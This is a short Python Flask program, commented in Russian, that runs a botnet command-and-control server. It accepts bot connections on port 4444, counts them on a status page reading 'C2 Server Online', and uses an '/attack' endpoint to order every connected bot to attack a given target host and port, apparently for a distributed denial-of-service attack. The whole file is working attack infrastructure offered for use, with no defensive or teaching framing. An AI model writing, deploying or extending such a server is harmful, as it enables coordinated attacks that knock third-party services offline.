from flask import Flask, request, jsonify
import socket
import threading

app = Flask(__name__)

# Список подключенных ботов
bots = []

def handle_bot(conn, addr):
    bots.append(conn)
    print(f"[+] Бот подключился: {addr}")
    while True:
        try:
            data = conn.recv(1024)
            if not data:
                break
        except:
            break
    if conn in bots:
        bots.remove(conn)
    conn.close()

# Фоновый сокет-сервер для ботов
def start_socket():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(100)
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()

# Главная страница (чтобы Render видел, что сервер жив)
@app.route('/')
def home():
    return f"C2 Server Online. Bots connected: {len(bots)}"

# Атака
@app.route('/attack')
def attack():
    target = request.args.get('target')
    port = request.args.get('port', '80')
    if not target:
        return "No target provided", 400
    
    sent = 0
    for bot in bots:
        try:
            bot.send(f"ATTACK {target} {port}".encode())
            sent += 1
        except:
            pass
            
    return jsonify({"status": "ok", "target": target, "bots_used": sent})

if __name__ == "__main__":
    # Запускаем сокет в отдельном потоке
    threading.Thread(target=start_socket, daemon=True).start()
    # Flask слушает порт от Render
    app.run(host='0.0.0.0', port=10000)
